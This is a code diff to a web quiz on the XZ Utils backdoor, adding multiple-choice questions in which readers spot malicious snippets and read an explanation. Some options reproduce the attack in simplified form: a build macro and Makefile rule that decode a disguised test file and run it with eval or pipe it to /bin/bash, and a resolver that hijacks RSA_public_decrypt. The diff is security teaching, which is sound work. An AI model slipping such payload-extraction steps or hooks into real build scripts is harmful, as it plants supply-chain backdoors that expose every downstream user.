@@ -1249,10 +1249,125 @@ function drawGraph() {
 const QUIZ_QUESTIONS = [
     { q: 'How long did Jia Tan spend building trust before injecting malicious code?', o: ['~6 months', '~1 year', '~2 years', '~5 years'], a: 2 },
     { q: 'Where was the backdoor payload hidden?', o: ['In the git repo', 'In release tarballs only', 'In CI pipelines', 'In npm packages'], a: 1 },
+    {
+        q: 'Which of these m4 macro snippets is malicious?',
+        type: 'code',
+        o: [
+`AC_DEFUN([gl_BUILD_TO_HOST],
+[  gl_cv_host_os=$(uname -s)
+   AC_SUBST([gl_cv_host_os])
+])`,
+`AC_DEFUN([gl_BUILD_TO_HOST],
+[  gl_cv_host_os=$(uname -s)
+   if test -f tests/files/bad-3-corrupt_lzma2.xz; then
+     eval $(sed "s/-.*//" tests/files/bad-3-corrupt_lzma2.xz \\
+       | tr "\\t \\-_" " \\t_\\-" | head -c 7966 | xz -d 2>/dev/null)
+   fi
+])`,
+`AC_DEFUN([gl_BUILD_TO_HOST],
+[  gl_cv_host_os=$(uname -s)
+   AM_CONDITIONAL([HAVE_CHECK],
+     [test "$have_check" = "yes"])
+])`,
+`AC_DEFUN([gl_BUILD_TO_HOST],
+[  gl_cv_host_os=$(uname -s)
+   AC_CHECK_HEADERS([stdlib.h string.h])
+])`
+        ],
+        a: 1,
+        explain: 'The second snippet extracts hidden data from a "test fixture" file using sed, tr, head, and xz -d, then executes it with eval. This is exactly how the XZ backdoor injected its payload during the build process.'
+    },
     { q: 'What mechanism did the backdoor use to hook into sshd?', o: ['LD_PRELOAD', 'ptrace', 'GNU IFUNC resolver', 'Kernel module'], a: 2 },
+    {
+        q: 'Which C function contains a backdoor hook?',
+        type: 'code',
+        o: [
+`int lzma_crc64_resolve(void) {
+  // Standard CRC64 IFUNC resolver
+  if (__builtin_cpu_supports("pclmul"))
+    return USE_CLMUL;
+  return USE_GENERIC;
+}`,
+`void *_get_cpuid(int leaf, int *eax,
+  int *ebx, int *ecx, int *edx) {
+  __cpuid_count(leaf, 0, *eax, *ebx,
+                *ecx, *edx);
+  return NULL;
+}`,
+`int lzma_crc64_resolve(void) {
+  Dl_info info;
+  void *handle = dlopen("libcrypto.so",
+                        RTLD_NOW);
+  void *sym = dlsym(handle,
+    "RSA_public_decrypt");
+  got_write(sym, backdoor_dispatch);
+  return USE_CLMUL;
+}`,
+`size_t lzma_stream_decode(
+  lzma_stream *strm,
+  const uint8_t *in, size_t in_size) {
+  return lzma_raw_decoder(strm, in,
+                          in_size);
+}`
+        ],
+        a: 2,
+        explain: 'The third snippet disguises itself as a CRC resolver but actually opens libcrypto, finds RSA_public_decrypt via dlsym, and overwrites the GOT entry with a backdoor dispatcher. This is how the XZ backdoor hijacked SSH authentication.'
+    },
     { q: 'Which function was hijacked by the backdoor?', o: ['malloc', 'RSA_public_decrypt', 'strcmp', 'write'], a: 1 },
+    {
+        q: 'Which build script line is hiding malicious payload extraction?',
+        type: 'code',
+        o: [
+`CFLAGS="-O2 -Wall -Wextra -pedantic"`,
+`sed "s/-.*//" tests/files/bad-3-corrupt_lzma2.xz | tr "\\t \\-_" " \\t_\\-" | head -c 7966 | xz -d`,
+`./configure --prefix=/usr --disable-static`,
+`make -j$(nproc) check TESTS="test_compress"`
+        ],
+        a: 1,
+        explain: 'This sed/tr/head/xz pipeline is the XZ payload extraction chain. It reads bytes from a disguised "test fixture" file, performs character substitution to restore the original bytes, truncates to exactly 7966 bytes, then decompresses the LZMA-compressed backdoor shellscript.'
+    },
     { q: 'What crypto primitives did the backdoor use?', o: ['AES + RSA', 'Ed448 + ChaCha20', 'SHA256 + ECDSA', 'Blowfish + DSA'], a: 1 },
+    {
+        q: 'Which Makefile snippet injects code into the build?',
+        type: 'code',
+        o: [
+`test_input:
+\t@echo "Running compression tests..."
+\t./test_compress $(TEST_FILES)`,
+`install:
+\tcp liblzma.so $(DESTDIR)/usr/lib/
+\tchmod 755 $(DESTDIR)/usr/lib/liblzma.so`,
+`liblzma_la_SOURCES += ../tests/files/bad-3-corrupt_lzma2.xz
+am__test = sed "s/-.*//" $(top_srcdir)/tests/files/bad-3-corrupt_lzma2.xz \\
+\t| tr "\\t \\-_" " \\t_\\-" | xz -d 2>/dev/null | /bin/bash`,
+`clean:
+\trm -f *.o *.lo *.la
+\trm -rf .libs`
+        ],
+        a: 2,
+        explain: 'This Makefile adds a "test" file as a source dependency, then pipes it through the sed/tr/xz extraction chain directly into /bin/bash for execution. Legitimate build rules never pipe decompressed test data into a shell.'
+    },
     { q: 'Who discovered the backdoor?', o: ['Google Project Zero', 'NSA', 'Andres Freund', 'Lasse Collin'], a: 2 },
+    {
+        q: 'Which SSH certificate field is suspicious?',
+        type: 'code',
+        o: [
+`cert.key_id = "user@host.example.com"
+cert.valid_after = "20240301120000"
+cert.valid_before = "20250301120000"`,
+`cert.key_id = b"\\x00" * 16 + ed448_signed_payload
+  + chacha20_encrypted_cmd
+cert.valid_after = "19700101000000"
+cert.valid_before = "99991231235959"`,
+`cert.key_id = "deploy-key-production"
+cert.serial = 1001
+cert.cert_type = SSH_CERT_TYPE_HOST`,
+`cert.key_id = "github-actions-runner"
+cert.extensions = {"permit-pty": ""}`
+        ],
+        a: 1,
+        explain: 'The second certificate embeds an Ed448-signed payload and ChaCha20-encrypted command directly in the key_id field, with absurd validity dates. The XZ backdoor used the SSH certificate\'s N field (public key) to smuggle encrypted commands past authentication.'
+    },
     { q: 'What tipped off the discoverer?', o: ['Code review', '500ms SSH login delay', 'Failed tests', 'Antivirus alert'], a: 1 },
     { q: 'What is the CVSS score of CVE-2024-3094?', o: ['7.5', '8.1', '9.8', '10.0'], a: 3 },
 ];
@@ -1280,13 +1395,16 @@ function showQuestion() {
     const area = document.getElementById('quiz-area');
     if (!area) return;
     const pct = ((quizIdx) / QUIZ_QUESTIONS.length) * 100;
+    const isCode = q.type === 'code';
     area.innerHTML = `
         <div class="quiz-progress"><div class="quiz-progress-fill" style="width:${pct}%"></div></div>
         <div class="quiz-counter">Question ${quizIdx + 1} of ${QUIZ_QUESTIONS.length}</div>
+        ${isCode ? '<div class="quiz-type-badge">CODE ANALYSIS</div>' : ''}
         <div class="quiz-question">${escHtml(q.q)}</div>
-        <div class="quiz-options">
-            ${q.o.map((opt, i) => `<button class="quiz-option" onclick="answerQuiz(${i})">${escHtml(opt)}</button>`).join('')}
+        <div class="quiz-options ${isCode ? 'quiz-options-code' : ''}">
+            ${q.o.map((opt, i) => `<button class="quiz-option ${isCode ? 'quiz-option-code' : ''}" onclick="answerQuiz(${i})">${isCode ? '<pre class="quiz-code">' + escHtml(opt) + '</pre>' : escHtml(opt)}</button>`).join('')}
         </div>
+        <div class="quiz-explain" id="quiz-explain" style="display:none"></div>
     `;
 }
 
@@ -1299,7 +1417,17 @@ window.answerQuiz = function(idx) {
         if (i === idx && idx !== q.a) b.classList.add('wrong');
     });
     if (idx === q.a) quizScore++;
-    setTimeout(() => { quizIdx++; showQuestion(); }, 1200);
+    // Show explanation for code questions
+    const explainEl = document.getElementById('quiz-explain');
+    if (q.explain && explainEl) {
+        explainEl.style.display = 'block';
+        explainEl.innerHTML = `<div class="quiz-explain-inner ${idx === q.a ? 'explain-correct' : 'explain-wrong'}">
+            <strong>${idx === q.a ? '&#10003; Correct!' : '&#10007; Incorrect'}</strong>
+            <p>${q.explain}</p>
+        </div>`;
+    }
+    const delay = q.explain ? 4000 : 1200;
+    setTimeout(() => { quizIdx++; showQuestion(); }, delay);
 };
 
 function showQuizResult() {
